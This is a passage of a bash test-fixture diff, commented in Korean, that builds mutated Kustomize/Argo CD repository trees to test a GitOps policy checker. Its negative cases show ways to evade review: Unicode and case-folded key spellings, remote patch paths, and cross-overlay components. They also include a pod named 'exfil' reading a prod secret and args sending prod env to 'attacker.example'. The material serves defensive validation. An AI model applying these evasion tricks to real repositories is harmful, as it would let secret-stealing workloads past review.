+apb_val_hosts_domain() { ap_app "$1" && ap_cm dev ALLOWED_HOSTS 'identity-admin.jt-dev.svc,identity-m2m-dev.joshuatech.dev,.joshuatech.dev'; }
+apb_val_exempt_extra() { ap_app "$1" && ap_cm dev JT_PLACEHOLDER_EXEMPT 'AUTHENTIK_API_TOKEN,OPENFGA_STORE_ID,OPENFGA_PRESHARED_KEY,ACCESS_AUD_M2M'; }
+apb_val_env_same() { ap_app "$1" && ap_cm prod ACCESS_AUD_M2M '"0000000000000000000000000000000000000000000000000000000000000000"'; }
+apb_val_team_domain() { ap_app "$1" && ap_cm dev ACCESS_TEAM_DOMAIN evil.cloudflareaccess.com; }
+apb_val_kafka_bootstrap() { ap_app "$1" && ap_cm dev KAFKA_BOOTSTRAP kafka.joshuatech.dev:9093; }
+# 14.5 APP-hook
+apb_hook_presync_postdelete() { ap_app "$1" && ap_patch dev Job identity-admin-migrate '- op: replace' '  path: /metadata/annotations/argocd.argoproj.io~1hook' \
+  '  value: PreSync,PostDelete'; }
+apb_hook_x_helm_postdelete() { ap_app "$1" && ap_patch dev Service identity-admin '- op: add' '  path: /metadata/annotations' '  value:' \
+  '    argocd.argoproj.io/hook: X' '    helm.sh/hook: post-delete'; }
+apb_hook_helm_predelete() { ap_app "$1" && ap_patch dev Deployment identity-admin-celery '- op: add' '  path: /metadata/annotations/helm.sh~1hook' \
+  '  value: pre-delete'; }
+apb_hook_tests_path() {
+  ap_new "$1" || return 1
+  ap_put platform/policies/tests/kustomization.yaml 'apiVersion: kustomize.config.k8s.io/v1beta1' 'kind: Kustomization' 'namespace: jt-dev' \
+    'resources:' '  - configmap-assert.yaml' || return 1
+  ap_put platform/policies/tests/configmap-assert.yaml 'apiVersion: v1' 'kind: ConfigMap' 'metadata:' '  name: assert-config' '  annotations:' \
+    '    argocd.argoproj.io/hook: PreSync' 'data:' '  K: v'
+}
+# 14.6 APP-image
+apb_img_no_entry() { ap_app "$1" && ap_yq "$AP_OV/dev/kustomization.yaml" 'del(.images)'; }
+apb_img_foreign() { ap_app "$1" && ap_add_container tool busybox:1.37; }
+apb_img_cronjob_no_deploy() {
+  ap_app "$1" || return 1
+  ap_put "$AP_OV/dev/cronjob.yaml" 'apiVersion: batch/v1' 'kind: CronJob' 'metadata:' '  name: identity-admin-tool' 'spec:' '  schedule: "0 3 * * *"' \
+    '  jobTemplate:' '    spec:' '      template:' '        spec:' '          restartPolicy: Never' '          automountServiceAccountToken: false' \
+    '          containers:' '            - name: tool' '              image: busybox:1.37' || return 1
+  ap_put "$AP_OV/dev/kustomization.yaml" 'apiVersion: kustomize.config.k8s.io/v1beta1' 'kind: Kustomization' 'namespace: jt-dev' 'resources:' \
+    '  - cronjob.yaml'
+}
+# 14.7 APP-kinds
+apb_kind_tlsoption() {
+  ap_app "$1" || return 1
+  ap_put "$AP_OV/dev/tlsoption.yaml" 'apiVersion: traefik.io/v1alpha1' 'kind: TLSOption' 'metadata:' '  name: default' 'spec:' '  minVersion: VersionTLS10' \
+    || return 1
+  ap_res "$AP_OV/dev/kustomization.yaml" tlsoption.yaml
+}
+apb_kind_secret() {
+  ap_app "$1" || return 1
+  ap_put "$AP_OV/dev/secret.yaml" 'apiVersion: v1' 'kind: Secret' 'metadata:' '  name: identity-admin-extra' 'type: Opaque' || return 1
+  ap_res "$AP_OV/dev/kustomization.yaml" secret.yaml
+}
+apb_svc_nodeport() { ap_app "$1" && ap_patch dev Service identity-admin '- op: replace' '  path: /spec/type' '  value: NodePort' '- op: add' \
+  '  path: /spec/ports/0/nodePort' '  value: 30080'; }
+# 14.8 APP-remote
+AP_KDEV="$AP_OV/dev/kustomization.yaml"
+AP_KPROD="$AP_OV/prod/kustomization.yaml"
+AP_KBASE='apps/identity-admin/base/kustomization.yaml'
+apb_remote_resource_https() { ap_app "$1" && ap_res "$AP_KDEV" https://example.invalid/x.yaml; }
+apb_remote_git_ssh() { ap_app "$1" && ap_res "$AP_KDEV" git@example.invalid:evil/x.git; }
+apb_overlay_extra_dir() {
+  ap_app "$1" || return 1
+  ap_put "$AP_OV/dev/sub/kustomization.yaml" 'apiVersion: kustomize.config.k8s.io/v1beta1' 'kind: Kustomization' 'resources:' '  - service.yaml' || return 1
+  ap_put "$AP_OV/dev/sub/service.yaml" 'apiVersion: v1' 'kind: Service' 'metadata:' '  name: identity-admin-sub' 'spec:' '  ports:' '    - port: 80' || return 1
+  ap_res "$AP_KDEV" sub
+}
+apb_prod_patch_from_dev() {
+  ap_app "$1" || return 1
+  ap_put "$AP_OV/dev/p.yaml" 'apiVersion: v1' 'kind: ConfigMap' 'metadata:' '  name: identity-admin-config' 'data:' '  ENV: dev' || return 1
+  ap_yq "$AP_KPROD" '.patches += [{"path": "../dev/p.yaml"}]'
+}
+apb_prod_cmgen_from_dev() {
+  ap_app "$1" || return 1
+  ap_put "$AP_OV/dev/f.txt" 'x' || return 1
+  ap_yq "$AP_KPROD" '.configMapGenerator = [{"name": "identity-admin-gen", "files": ["../dev/f.txt"]}]'
+}
+apb_base_component_outside() {
+  ap_app "$1" || return 1
+  ap_put apps/identity-admin/shared/kustomization.yaml 'apiVersion: kustomize.config.k8s.io/v1alpha1' 'kind: Component' 'labels:' \
+    '  - pairs:' '      shared: "1"' || return 1
+  ap_yq "$AP_KBASE" '.components = ["../shared"]'
+}
+apb_app_helmcharts() { ap_app "$1" && ap_yq "$AP_KDEV" '.helmCharts = [{"name": "evil", "repo": "https://charts.example.invalid", "version": "1.0.0"}]'; }
+apb_prod_nested_component_from_dev() {
+  ap_app "$1" || return 1
+  ap_put "$AP_OV/prod/sub/kustomization.yaml" 'apiVersion: kustomize.config.k8s.io/v1alpha1' 'kind: Component' 'components:' '  - ../../dev/x' || return 1
+  ap_put "$AP_OV/dev/x/kustomization.yaml" 'apiVersion: kustomize.config.k8s.io/v1alpha1' 'kind: Component' 'labels:' '  - pairs:' \
+    '      from-dev: "1"' || return 1
+  ap_yq "$AP_KPROD" '.components = ["sub"]'
+}
+apb_base_nested_from_overlay() {
+  ap_app "$1" || return 1
+  ap_put apps/identity-admin/base/sub/kustomization.yaml 'apiVersion: kustomize.config.k8s.io/v1beta1' 'kind: Kustomization' 'resources:' \
+    '  - ../../overlays/dev/x' || return 1
+  ap_put "$AP_OV/dev/x/kustomization.yaml" 'apiVersion: kustomize.config.k8s.io/v1beta1' 'kind: Kustomization' 'resources:' '  - service.yaml' || return 1
+  ap_put "$AP_OV/dev/x/service.yaml" 'apiVersion: v1' 'kind: Service' 'metadata:' '  name: identity-admin-x' 'spec:' '  ports:' '    - port: 80' || return 1
+  ap_res "$AP_KBASE" sub
+}
+# 7.1 · 7.5 · 13.7 — Argo CD 자기 관리 경로 · AppProject(positive의 platform-argocd.yaml · platform/argocd · projects 사본)
+apb_argocd_path_platform() {
+  ap_new "$1" || return 1
+  mkdir -p "$AP_ROOT/clusters/oci-k3s/apps" "$AP_ROOT/platform/argocd" || return 1
+  cp "$AP_FIX/platform/argocd/kustomization.yaml" "$AP_ROOT/platform/argocd/" || return 1
+  cp "$AP_FIX/clusters/oci-k3s/apps/platform-argocd.yaml" "$AP_ROOT/clusters/oci-k3s/apps/" || return 1
+  ap_yq clusters/oci-k3s/apps/platform-argocd.yaml '.spec.source.path = "platform/argocd"'
+}
+ap_projects() { # <케이스> — positive의 clusters/oci-k3s/projects 사본
+  ap_new "$1" || return 1
+  mkdir -p "$AP_ROOT/clusters/oci-k3s" && cp -R "$AP_FIX/clusters/oci-k3s/projects" "$AP_ROOT/clusters/oci-k3s/"
+}
+apb_argocd_placeholder_projects() {
+  ap_projects "$1" || return 1
+  ap_put platform/argocd/kustomization.yaml 'apiVersion: kustomize.config.k8s.io/v1beta1' 'kind: Kustomization' 'resources:' \
+    '  - ../../clusters/oci-k3s/projects'
+}
+apb_argocd_placeholder_patch() {
+  ap_new "$1" || return 1
+  ap_put platform/argocd/kustomization.yaml 'apiVersion: kustomize.config.k8s.io/v1beta1' 'kind: Kustomization' 'resources: []' 'patches:' \
+    '  - target: { kind: AppProject, name: prod }' '    patch: |-' '      - op: add' '        path: /spec/namespaceResourceWhitelist/-' \
+    '        value: { group: traefik.io, kind: TLSOption }'
+}
+apb_proj_in_platform() {
+  ap_new "$1" || return 1
+  mkdir -p "$AP_ROOT/platform/monitoring" && cp "$AP_FIX/clusters/oci-k3s/projects/prod.yaml" "$AP_ROOT/platform/monitoring/appproject.yaml" || return 1
+  ap_put platform/monitoring/kustomization.yaml 'apiVersion: kustomize.config.k8s.io/v1beta1' 'kind: Kustomization' 'resources:' '  - appproject.yaml'
+}
+AP_PRJ='clusters/oci-k3s/projects/prod.yaml'
+apb_proj_prod_whitelist_extra() { ap_projects "$1" && ap_yq "$AP_PRJ" '.spec.namespaceResourceWhitelist += [{"group": "traefik.io", "kind": "TLSOption"}]'; }
+apb_proj_prod_dest_two() { ap_projects "$1" && ap_yq "$AP_PRJ" '.spec.destinations += [{"server": "https://kubernetes.default.svc", "namespace": "jt-dev"}]'; }
+apb_proj_prod_blacklist_short() { ap_projects "$1" && ap_yq "$AP_PRJ" 'del(.spec.namespaceResourceBlacklist[] | select(.kind == "RoleBinding"))'; }
+
+# (T075 보정 2026-11-18 — GP-1 리뷰 G1B-1 · G1B-2 · G1B-3 · G1A-1 · G1A-2 · G1A-5) 계약 「표 밖 새 검사 셋」 11.7 · 14.9 · 11.6 · 14.0 끝 · 14.8 보강
+#   리뷰어 재현(B 사본 트리 cik-comp · kz-root · bsn-xform · A 탐침 probe-tests-remote · probe-inline)을 그대로 옮긴 케이스와 사례 공백(G1A-5)을 채운 케이스.
+#   11.7은 번호 정정(2026-11-18 — 처음 적은 11.5는 기존 11.5 FMT-symlink와 겹쳤다)
+AP_KV='apiVersion: kustomize.config.k8s.io/v1beta1'
+AP_FOLD=$(printf 're\305\277ources')   # 'reſources'(U+017F 라틴 작은 글자 긴 s) — kustomize(encoding/json)는 resources로 읽는다
+ap_vault_kust() { # <케이스> <줄>... — 빈 트리에 platform/vault/kustomization.yaml 하나(앱 · 렌더와 떨어진 11.7 전용 트리)
+  local c=$1; shift
+  ap_new "$c" && ap_put platform/vault/kustomization.yaml "$AP_KV" 'kind: Kustomization' "$@"
+}
+# 11.7 FMT-kust-keys
+apb_kust_keys_case() { # 리뷰 B cik-comp — prod overlay의 Components:(대문자)가 관문 밖 overlays/dev의 Component로 prod Deployment에 인자를 넣는다
+  ap_app "$1" || return 1
+  ap_put "$AP_OV/dev/shared/kustomization.yaml" 'apiVersion: kustomize.config.k8s.io/v1alpha1' 'kind: Component' 'patches:' \
+    '  - target: { kind: Deployment, name: identity-admin }' '    patch: |-' '      - op: add' '        path: /spec/template/spec/containers/0/args' \
+    '        value: ["--exfil-prod-env-to", "attacker.example"]' || return 1
+  printf '%s\n' 'Components:' '  - ../dev/shared' >> "$AP_ROOT/$AP_KPROD"
+}
+apb_kust_keys_fold() { # prod overlay의 resources를 reſources(U+017F)로 — kustomize는 같은 필드로 읽고 소문자 키만 보던 검사는 항목을 못 본다
+  ap_app "$1" && sed -i "s/^resources:\$/${AP_FOLD}:/" "$AP_ROOT/$AP_KPROD"
+}
+apb_kust_keys_unknown() { ap_vault_kust "$1" 'resources: []' 'patchez: []'; }
+apb_kust_keys_dup() { ap_vault_kust "$1" 'resources: []' 'resources:' '  - ../../evil'; }
+apb_kust_keys_anchor() { ap_vault_kust "$1" 'resources: &r []' 'components: *r'; }
+apb_kust_keys_merge() { ap_vault_kust "$1" '<<: { resources: [] }'; }
+apb_kust_keys_tag() { ap_vault_kust "$1" 'resources: []' 'namespace: !!str vault'; }
+# 14.9 APP-kust-keys — 렌더를 바꾸지 않는 빈 값의 허용 밖 키(14.9만 걸린다)
+apb_app_kust_base_extra() { ap_app "$1" && ap_yq "$AP_KBASE" '.labels = []'; }
+apb_app_kust_overlay_extra() { ap_app "$1" && ap_yq "$AP_KDEV" '.buildMetadata = []'; }
+# 11.6 FMT-dirsource-files
+apb_dirsrc_kustomization() { # 리뷰 B kz-root — Kustomization + evil.txt(project prod · 이름 evil) + 관문 밖 디렉터리의 jt-prod Deployment
+  ap_app "$1" || return 1
+  ap_put clusters/oci-k3s/apps/Kustomization "$AP_KV" 'kind: Kustomization' 'resources:' '  - identity-admin-dev.yaml' '  - identity-admin-prod.yaml' \
+    '  - evil.txt' || return 1
+  cp "$AP_FIX/clusters/oci-k3s/apps/identity-admin-prod.yaml" "$AP_ROOT/clusters/oci-k3s/apps/evil.txt" || return 1
+  yq -i -p yaml -o yaml '.metadata.name = "evil" | .spec.source.path = "clusters/oci-k3s/x"' "$AP_ROOT/clusters/oci-k3s/apps/evil.txt" || return 1
+  ap_put clusters/oci-k3s/x/kustomization.yaml "$AP_KV" 'kind: Kustomization' 'namespace: jt-prod' 'resources:' '  - deploy.yaml' || return 1
+  ap_put clusters/oci-k3s/x/deploy.yaml 'apiVersion: apps/v1' 'kind: Deployment' 'metadata:' '  name: exfil' 'spec:' '  selector: {matchLabels: {app: exfil}}' \
+    '  template:' '    metadata: {labels: {app: exfil}}' '    spec:' '      containers:' '        - name: c' '          image: ghcr.io/joshua92y/identity-admin' \
+    '          envFrom:' '            - secretRef: {name: identity-admin-env}'
+}
+apb_dirsrc_json() { # directory source는 .json도 Application으로 읽는다(project prod · 이름 evil — *-prod.yaml 판정 밖)
+  ap_app "$1" || return 1
+  yq -o json '.metadata.name = "evil"' "$AP_FIX/clusters/oci-k3s/apps/identity-admin-prod.yaml" > "$AP_ROOT/clusters/oci-k3s/apps/evil.json"
+}
+apb_dirsrc_subdir() {
+  ap_app "$1" && ap_put clusters/oci-k3s/apps/sub/a.yaml 'apiVersion: v1' 'kind: ConfigMap' 'metadata:' '  name: sub-a' 'data:' '  K: v'
+}
+# 14.0 APP-app 끝(T075 보정 2026-11-18) — 이름과 무관하게 project dev/prod는 <pod>-<env> 이름만
+apb_app_project_prod_name() {
+  ap_app "$1" || return 1
+  cp "$AP_FIX/clusters/oci-k3s/apps/identity-admin-prod.yaml" "$AP_ROOT/clusters/oci-k3s/apps/evil.yaml" || return 1
+  ap_yq clusters/oci-k3s/apps/evil.yaml '.metadata.name = "evil"'
+}
+# 14.8 APP-remote 보강 — tests 범위 · 원격 꼴 열거 밖(대소문자 · scp 꼴) · 실재하지 않는 경로 · 인라인 · 역슬래시
+AP_TESTS_K='platform/policies/tests/kustomization.yaml'
+apb_remote_tests_forms() { # 리뷰 A probe-tests-remote — kustomize 5.8.1이 원격으로 읽는 세 꼴
+  ap_new "$1" && ap_put "$AP_TESTS_K" "$AP_KV" 'kind: Kustomization' 'resources:' '  - GitHub.com/acme-x/repo-x//dir?ref=main' \
+    '  - github.com:acme-x/repo-x//dir?ref=main' '  - jt@example.invalid:acme-x/repo-x//dir?ref=main'
+}
+apb_remote_tests_missing() { ap_new "$1" && ap_put "$AP_TESTS_K" "$AP_KV" 'kind: Kustomization' 'resources:' '  - missing-dir'; }
+apb_inline_transformer() { # 리뷰 A probe-inline — 인라인 PatchTransformer의 path가 원격 내용을 끌어온다(URL은 고정 포트에 기대지 않는다 — G1A-11)
+  ap_app "$1" || return 1
+  AP_TX=$(printf '%s\n' 'apiVersion: builtin' 'kind: PatchTransformer' 'metadata:' '  name: remote' 'path: http://example.invalid/p2.yaml' 'target:' \
+    '  kind: ConfigMap' '  name: identity-admin-config') yq -i '.transformers = [strenv(AP_TX)]' "$AP_ROOT/$AP_KPROD"
+}
+apb_xform_backslash() { # 리뷰 B bsn-xform — '../dev/x\n'(글자 역슬래시-n): Windows는 ..\dev\x\n = overlays/dev/x/n으로 읽는다
+  ap_app "$1" || return 1
+  ap_put "$AP_OV/dev/x/n/kustomization.yaml" "$AP_KV" 'kind: Kustomization' 'resources:' '  - pt.yaml' || return 1
+  ap_put "$AP_OV/dev/x/n/pt.yaml" 'apiVersion: builtin' 'kind: PatchTransformer' 'metadata:' '  name: prod-args' \
+    "patch: '[{\"op\": \"add\", \"path\": \"/spec/template/spec/containers/0/args\", \"value\": [\"--exfil\"]}]'" 'target:' '  kind: Deployment' \
+    '  name: identity-admin' || return 1
+  printf '%s\n' 'transformers:' "  - '../dev/x\\n'" >> "$AP_ROOT/$AP_KPROD"
+}
+# 사례 공백(G1A-5) — 13.7 원본 파일만 있는 AppProject · 7.5 이름 변형(.yml · Kustomization)
+apb_proj_file_only() {
+  ap_new "$1" && mkdir -p "$AP_ROOT/platform/monitoring" && cp "$AP_FIX/clusters/oci-k3s/projects/prod.yaml" "$AP_ROOT/platform/monitoring/appproject.yaml"
+}
+apb_argocd_placeholder_yml() {
+  ap_projects "$1" && ap_put platform/argocd/kustomization.yml "$AP_KV" 'kind: Kustomization' 'resources:' '  - ../../clusters/oci-k3s/projects'
+}
+apb_argocd_placeholder_kust() {
+  ap_new "$1" && ap_put platform/argocd/Kustomization "$AP_KV" 'kind: Kustomization' 'resources: []' 'patches:' \
+    '  - target: { kind: AppProject, name: prod }' '    patch: |-' '      - op: add' '        path: /spec/namespaceResourceWhitelist/-' \
+    '        value: { group: traefik.io, kind: TLSOption }'
+}
+
+# (T075 보정 2026-11-18 — 재검토 G1B-4 · G1A-7 · G1A-8 · G1A-10 · G1A-11) 11.7 중첩 · 14.9 모든 깊이 · 14.8 tests 키 집합 · 검사 1 네트워크 없는 렌더.
+#   중첩 철자 변형: kustomize 5.8.1은 Patch 구조체 필드도 대소문자 무시로 읽는다 — 리뷰 B nested-path-url(dev overlay) · 리뷰 A probe-nested-path(prod
+#   overlay)는 patches: [{Path: <URL>}]로 원격 내용을 렌더에 넣었다. URL은 example.invalid(고정 포트에 기대지 않는다 — G1A-11)이고 프록시를 막은 환경
+#   (AP_NONET)으로 돈다. 렌더를 바꾸지 않는 철자 변형(Target · NewName · target.Kind)은 그 코드만 걸린다
+AP_URL='http://example.invalid/p.yaml'
+AP_TCM='{"kind": "ConfigMap", "name": "identity-admin-config"}'
+AP_FOLDF=$(printf 'file\305\277')   # 'fileſ'(U+017F) — kustomize(encoding/json)는 configMapGenerator[].files로 읽는다
+AP_TCMF=('apiVersion: v1' 'kind: ConfigMap' 'metadata:' '  name: assert-config' 'data:' '  K: v')
+AP_PTEST=('- op: test' '  path: /kind' '  value: ConfigMap')   # 렌더를 바꾸지 않는 JSON6902 패치(같은 디렉터리 파일)
+ap_tests_kust() { # <케이스> <줄>... — 빈 트리에 platform/policies/tests(ConfigMap 하나 + kustomization — resources: [cm.yaml] 뒤에 줄을 덧붙인다)
+  local c=$1; shift
+  ap_new "$c" && ap_put platform/policies/tests/cm.yaml "${AP_TCMF[@]}" && ap_put "$AP_TESTS_K" "$AP_KV" 'kind: Kustomization' 'resources:' '  - cm.yaml' "$@"
+}
+apb_nested_path_url() { ap_app "$1" && ap_yq "$AP_KDEV" ".patches += [{\"Path\": \"$AP_URL\", \"target\": $AP_TCM}]"; }
+apb_nested_path_case() { ap_app "$1" && ap_yq "$AP_KPROD" ".patches += [{\"Path\": \"$AP_URL\", \"target\": $AP_TCM}]"; }
+apb_nested_path_local() { # 같은 디렉터리 파일이어도 — 소문자 path만 읽던 14.8은 이 항목을 보지 못했다
+  ap_app "$1" && ap_put "$AP_OV/dev/p.yaml" "${AP_PTEST[@]}" && ap_yq "$AP_KDEV" ".patches += [{\"Path\": \"p.yaml\", \"target\": $AP_TCM}]"
+}
+apb_nested_path_tests() { ap_tests_kust "$1" 'patches:' "  - Path: $AP_URL" '    target:' '      kind: ConfigMap'; }
+apb_nested_image_newname_case() { ap_app "$1" && sed -i 's/^    newName:/    NewName:/' "$AP_ROOT/$AP_KDEV"; }
+apb_nested_patch_target_case() { ap_app "$1" && sed -i 's/^  - target: { kind: ConfigMap,/  - Target: { kind: ConfigMap,/' "$AP_ROOT/$AP_KDEV"; }
+apb_nested_fold_nonascii() { # 앱 · tests 밖 kustomization(11.7은 저장소 전체)
+  ap_vault_kust "$1" 'configMapGenerator:' '  - name: vault-extra' "    ${AP_FOLDF}:" '      - a.txt' && ap_put platform/vault/a.txt 'x'
+}
+apb_nested_dup() { # 항목 0 = 같은 키 둘(접기 전) · 항목 1 = path와 Path(접으면 같은 필드 — encoding/json은 마지막 값을 쓴다)
+  ap_vault_kust "$1" 'resources: []' 'patches:' '  - target: { kind: ConfigMap }' "    patch: '[]'" "    patch: '[]'" \
+    '  - target: { kind: ConfigMap }' '    path: p.yaml' '    Path: q.yaml'
+}
+# 14.9 모든 깊이 — 앱 patches[] 키 = {target, patch}(인라인 패치만) · images[] 키 = {name, newName, digest} · target 키 = Selector 필드(철자 정확히)
+apb_app_kust_deep_extra() { ap_app "$1" && sed -i 's/^  - target: { kind: ConfigMap,/  - target: { Kind: ConfigMap,/' "$AP_ROOT/$AP_KDEV"; }
+apb_app_patch_options() { ap_app "$1" && ap_yq "$AP_KDEV" '.patches[0].options = {"allowNameChange": false}'; }
+apb_app_patch_path_local() { # 소문자 path · 같은 디렉터리 파일 — 14.8은 받고 14.9가 막는다(앱에서 경로를 받는 중첩 자리를 없앤다)
+  ap_app "$1" && ap_put "$AP_OV/dev/p.yaml" "${AP_PTEST[@]}" && ap_yq "$AP_KDEV" ".patches += [{\"path\": \"p.yaml\", \"target\": $AP_TCM}]"
+}
+apb_app_image_newtag() { ap_app "$1" && ap_yq "$AP_KDEV" '.images[0].newTag = "v1"'; }
+apb_app_kust_base_missing() { ap_app "$1" && ap_yq "$AP_KBASE" 'del(.apiVersion)'; }   # 렌더는 같다(kustomize가 기본값을 채운다)
+# 14.8 tests 범위 키 집합(재검토 G1A-8 — 리뷰 A probe-tests-xfile) · configurations 항목(G1A-10)
+apb_tests_xform_file() { # (a) 같은 디렉터리 transformer 설정 파일 안의 path: https://… — 항목은 실재 파일이라 경로 판정을 지난다
+  ap_tests_kust "$1" 'transformers:' '  - pt.yaml' && ap_put platform/policies/tests/pt.yaml 'apiVersion: builtin' 'kind: PatchTransformer' \
+    'metadata:' '  name: pt' 'path: https://example.invalid/p.yaml' 'target:' '  kind: ConfigMap'
+}
+apb_tests_helm_values() { # (b) helmCharts[].valuesFile 원격(차트 쌍은 12.1 허용 목록 — 키 판정만 걸린다)
+  ap_tests_kust "$1" 'helmCharts:' '  - name: reloader' '    repo: https://stakater.github.io/stakater-charts' '    version: 2.2.5' \
+    '    valuesFile: https://example.invalid/values.yaml'
+}
+apb_tests_key_extra() { ap_tests_kust "$1" 'nameSuffix: -x'; }
+apb_remote_configurations() { ap_tests_kust "$1" 'configurations:' '  - https://example.invalid/c.yaml' '  - missing-config.yaml'; }
+# 14.8 tests 범위 항목 = 같은 디렉터리의 파일(마지막 재검토 G1B-6 — `-e`만 보던 판정은 디렉터리 항목을 통과시켜, 키 검사가 열지 않는 루트 tests/ 아래
+#   kustomization을 tests 렌더가 끌어올 수 있었다). ap_tests_kust 뒤에 준 줄은 resources 목록(cm.yaml 다음)에 붙는다
+AP_TCMX=('apiVersion: v1' 'kind: ConfigMap' 'metadata:' '  name: assert-extra' 'data:' '  K: v')
+apb_tests_res_subdir() { # ① 하위 디렉터리 kustomization
+  ap_tests_kust "$1" '  - sub' && ap_put platform/policies/tests/sub/kustomization.yaml "$AP_KV" 'kind: Kustomization' 'resources:' '  - cm.yaml' \
+    && ap_put platform/policies/tests/sub/cm.yaml "${AP_TCMX[@]}"
+}
+apb_tests_res_roottests() { # ② 루트 tests/의 디렉터리(파일 열거 · KUST_FILES가 열지 않는 자리)
+  ap_tests_kust "$1" '  - ../../../tests/x' && ap_put tests/x/kustomization.yaml "$AP_KV" 'kind: Kustomization' 'resources:' '  - cm.yaml' \
+    && ap_put tests/x/cm.yaml "${AP_TCMX[@]}"
+}
+apb_tests_res_parent() { ap_tests_kust "$1" '  - ../x.yaml' && ap_put platform/policies/x.yaml "${AP_TCMX[@]}"; }   # ③ 상위 디렉터리 파일
+# 검사 1 「네트워크 없는 렌더」(재검토 G1B-4) — kustomize 심이 build마다 차단 env를 한 줄로 찍고 실패한다(렌더하지 않는다 — 네트워크 0). Go net/http는
+#   루프백을 프록시하지 않아 로컬 HTTP 서버로는 증명할 수 없다 — 그래서 렌더 프로세스의 env를 본다. 바깥 env = 감시 값(AP_NONET_SENT — 닫힌 로컬 포트 ·
+#   IP라 이름 풀이도 없다): 앱 · tests 렌더 = 차단 값 · 그 밖(platform/vault · 경로 성분이 다른 platform/policies/testsx) = 감시 값 그대로
+AP_NONET_BIN="$TMP/nonet-bin"
+AP_NONET_VARS='HTTPS_PROXY https_proxy HTTP_PROXY http_proxy ALL_PROXY all_proxy NO_PROXY no_proxy GIT_ALLOW_PROTOCOL GIT_SSH_COMMAND'
+AP_NONET_SENT=(--env 'HTTPS_PROXY=http://127.0.0.1:1' --env 'https_proxy=http://127.0.0.1:1' --env 'HTTP_PROXY=http://127.0.0.1:1'
+  --env 'http_proxy=http://127.0.0.1:1' --env 'ALL_PROXY=http://127.0.0.1:1' --env 'all_proxy=http://127.0.0.1:1' --env 'NO_PROXY=127.0.0.2'
+  --env 'no_proxy=127.0.0.2' --env 'GIT_ALLOW_PROTOCOL=sentinel' --env 'GIT_SSH_COMMAND=sentinel')
+apb_nonet_render_env() {
+  local real v probe='NONET-PROBE'
+  real=$(command -v kustomize) || return 1
+  ap_app "$1" || return 1
+  ap_put "$AP_TESTS_K" "$AP_KV" 'kind: Kustomization' 'resources: []' || return 1
+  ap_put platform/policies/tests/sub/kustomization.yaml "$AP_KV" 'kind: Kustomization' 'resources: []' || return 1
+  ap_put platform/policies/testsx/kustomization.yaml "$AP_KV" 'kind: Kustomization' 'resources: []' || return 1
+  ap_put platform/vault/kustomization.yaml "$AP_KV" 'kind: Kustomization' 'resources: []' || return 1
+  for v in $AP_NONET_VARS; do probe+=" $v=\${$v-<unset>}"; done
+  mkdir -p "$AP_NONET_BIN" || return 1
+  printf '%s\n' '#!/usr/bin/env bash' "if [[ \${1:-} == build ]]; then printf '%s\\n' \"$probe\" >&2; exit 3; fi" "exec '$real' \"\$@\"" \
+    > "$AP_NONET_BIN/kustomize" && chmod +x "$AP_NONET_BIN/kustomize"
+}
+
+AP_CASES='app-base-ok app-skeleton app-unknown-pod es-app-datafrom es-app-merge es-app-refresh es-app-admin-key es-app-other-pod es-app-extra-es
+  es-app-template-host es-app-item-sourceref app-project-platform app-dest-crossenv app-overlay-clusterkind app-file-name-mismatch app-file-two-docs
+  app-ns-not-argocd env-forbidden env-proxy env-outside-ref migrate-ref-projected migrate-ref-pod env-literal-override envfrom-extra-cm
+  es-template-overrides-cm env-sidecar-extra cm-missing cm-placeholder cm-aud-form cm-cn-form cm-extra-key cm-second-configmap ing-host-alias
+  ing-extra-path ing-admin-in-dev ing-priority mw-extra-prefix ing-third-name ing-admin-entrypoint-web ing-only-foreign-host val-writes-prod-false
+  val-hosts-domain val-exempt-extra val-env-same val-team-domain val-kafka-bootstrap hook-presync-postdelete hook-x-helm-postdelete
+  hook-helm-predelete hook-tests-path img-no-entry img-foreign img-cronjob-no-deploy kind-tlsoption kind-secret svc-nodeport remote-resource-https
+  remote-git-ssh overlay-extra-dir prod-patch-from-dev prod-cmgen-from-dev base-component-outside app-helmcharts prod-nested-component-from-dev
+  base-nested-from-overlay argocd-path-platform argocd-placeholder-projects argocd-placeholder-patch proj-in-platform proj-prod-whitelist-extra
+  proj-prod-dest-two proj-prod-blacklist-short
+  kust-keys-case kust-keys-fold kust-keys-unknown kust-keys-dup kust-keys-anchor kust-keys-merge kust-keys-tag app-kust-base-extra
+  app-kust-overlay-extra dirsrc-kustomization dirsrc-json dirsrc-subdir app-project-prod-name remote-tests-forms remote-tests-missing
+  inline-transformer xform-backslash proj-file-only argocd-placeholder-yml argocd-placeholder-kust
+  nested-path-url nested-path-case nested-path-local nested-path-tests nested-image-newname-case nested-patch-target-case nested-fold-nonascii
+  nested-dup app-kust-deep-extra app-patch-options app-patch-path-local app-image-newtag app-kust-base-missing tests-xform-file tests-helm-values
+  tests-key-extra remote-configurations nonet-render-env tests-res-subdir tests-res-roottests tests-res-parent'
+if command -v kustomize >/dev/null 2>&1; then
+  # (기준) 변이 없는 사본 — 새 코드 전부 PASS(그룹 PASS 줄의 수까지)
+  ap_neg
+  ap_case app-base-ok 1 \
+    '+[PASS] 3.9 ES-app — apps/** ExternalSecret 8개(원본 2 · 렌더 6)' \
+    '+[PASS] 7.5 WAVE-argocd-placeholder — platform/argocd/kustomization.yaml 없음 — 대상 없음' \
+    '+[PASS] 13.7 RBAC-appproject — AppProject 0개 — 대상 없음(대상 0)' \
+    '+[PASS] 14.0 APP-app — clusters/oci-k3s/apps 파일 2개: 문서 하나 · kind Application · metadata.name = 파일 이름 — 앱 Application 2개' \
+    '+[PASS] 14.1 APP-env — overlay 렌더 2개 · pod 템플릿 객체 6개 · 컨테이너 10개' \
+    '+[PASS] 14.2 APP-cm — overlay 렌더 2개 중 pod 템플릿 객체 있음 2개' \
+    '+[PASS] 14.3 APP-ingress — overlay 렌더 2개 · Ingress 3개(m2m 2 · admin 1) · Middleware 1개' \
+    '+[PASS] 14.4 APP-values — overlay 렌더 2개 중 pod 템플릿 객체 있음 2개: ConfigMap 값 = pod 표(env별) · 면제 상한 · dev ≠ prod 1쌍' \
+    '+[PASS] 14.5 APP-hook' '+[PASS] 14.6 APP-image — overlay 렌더 2개 · 컨테이너 10개' '+[PASS] 14.7 APP-kinds — overlay 렌더 2개 · 객체 18개' \
+    '+[PASS] 14.8 APP-remote — kustomization 3개(apps/** 3 · platform/policies/tests/** 0)' \
+    '+[PASS] 11.7 FMT-kust-keys — kustomization 파일 3개 · 최상위 키 15개 모두 정본 철자' \
+    '+· 병합 키 · 태그 0 · 중첩(경로를 받는 구조체 항목 6개의 직속 키 12개' \
